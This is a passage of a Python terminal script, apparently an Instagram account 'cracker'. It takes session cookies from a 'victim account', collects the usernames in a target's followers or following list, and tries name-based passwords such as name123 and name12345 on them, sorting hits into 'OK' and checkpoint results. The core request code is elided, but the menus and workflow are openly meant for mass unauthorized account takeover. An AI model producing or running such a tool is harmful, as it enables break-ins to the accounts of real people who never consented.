...
( COMMAND BY  √[bold green] JINDY MERIYE [bold white]) ''','color(8)')

def masuk():
    os.system('clear');banner()
    ulfah('[bold white]Enter your Instagram Account cookies, Make sure to use a Victim Account','color(8)')
    ...
    try:
         with requests.Session() as xyzu:
             ...
             Console(width=50).print(Panel(f"[bold white] Welcome users [bold green]{link}[italic white]",title='🤗', style='bold white'))
             bot(coki,re.search('csrftoken=(.*?);',str(coki)).group(1))
    except (AttributeError,KeyError):
         Console(width=50).print(Panel("[bold red] Your Cookie Has Expired / Your Account Has Died Please Check First",title='😭', style='bold white'));time.sleep(3);masuk()

#DO NOT REPLACE IT, YOU CAN ADD Hamza
def bot(ku_jangan_di_ganti_asu,token):
    with requests.Session() as xyzu:
         try:
              ...
              Console(width=70).print(Panel(" [italic red]No active internet connection!", title='🧐', style='bold red'));exit(0)
...
[bold white][[bold green]•[bold white]] Following : [bold green]{wing}''','color(8)')
    ulfah('''[bold white][[bold green]1[bold white]] Crack From followers
[bold white][[bold green]2[bold white]] Crack From following
[bold white][[bold green]3[bold white]] Check Result
[bold white][[bold green]0[bold white]] Get out...''','color(8)')
    cuih = input(f'  {H}• {N}Select : {H}')
    if cuih in ['F','HAMZA']:
        ulfah('[bold white]Enter the target username, you can also use a comma to separate the example name1, name2','color(8)')
        nama = input(f'  {H}• {N}Enter Name : {H}')
        user = convert(nama,coki)
        dump().followers(user,coki,'')

    elif cuih in ['2','02']:
        ulfah('[bold white]Enter the target username, you can also use a comma to separate the example name1, name2','color(8)')
        nama = input(f'  {H}• {N}Enter Nama : {H}')
        user = convert(nama,coki)
        dump().following(user,coki,khamdihidev=' ')
    elif cuih in ['3','03']:
        afah,iyah=[],0
        ulfah('[bold white][[bold green]1[bold white]] Check Result [bold green]OK\n[bold white][[bold green]2[bold white]] Check Result [bold yellow]CP','color(8)')
        akun = input(f'  {H}• {N}Select menu : {H}')
        if akun in ['1','01']:
...
class dump:
    ...
    def following(self, userid, cookies, khamdihidev):
          with requests.Session() as kontol:
               try:
                     ...
                     Console(width=50).print(Panel("[bold red]dump error, find another username or replace it",style="bold cyan"));time.sleep(2);menu()
    ...
    def selanjutnya(self, kontol):
        ...
        print(f'\r  {H}• {N}Successfully dump username : {H}{len(kontol)}')
...
[bold white][[bold green]3[bold white]] sandi : nama,nama123,nama1234,nama12345 ++''','color(8)')
        ...
        if sandi in ['3','03']:
           ulfah('[bold white]use a comma to separate the example password1,password2','color(8)')
